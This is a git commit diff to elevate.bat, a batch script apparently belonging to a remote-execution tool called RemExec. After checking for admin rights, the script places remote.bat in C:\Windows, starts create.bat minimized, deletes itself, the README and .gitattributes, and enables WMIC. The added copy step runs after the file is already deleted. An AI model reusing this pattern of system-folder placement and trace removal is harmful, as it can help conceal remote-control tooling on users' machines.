5128c8c80fe696004ea84833ec796ae52b0b6092
GVIO <ampleevvlad11@gmail.com>
2024-11-05 19:24:13 +0200

    .

--- elevate.bat
+++ elevate.bat
@@ -52,18 +52,17 @@ set "dir=%cd%"
 
  cls
  net session >nul 2>&1
-    if %errorLevel% == 0 (
-      cd %localappdata%\Programs\RemExec
-      del /Y C:\Windows\remote.bat
-      move /Y remote.bat "C:\Windows"
-      start /min create.bat
-      del /q elevate.bat
-      del /q README.md
-      del /q .gitattributes
-      cd %dir%
-      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
-      exit
-    ) else (
-       exit
-    )
-
+if %errorLevel% == 0 (
+   cd %localappdata%\Programs\RemExec
+   del /Y C:\Windows\remote.bat
+   move /Y remote.bat "C:\Windows"
+   start /min create.bat
+   del /q elevate.bat
+   del /q README.md
+   del /q .gitattributes
+   DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+   xcopy /Y /Q elevate.bat C:\Windows
+   exit
+) else (
+   exit
+)
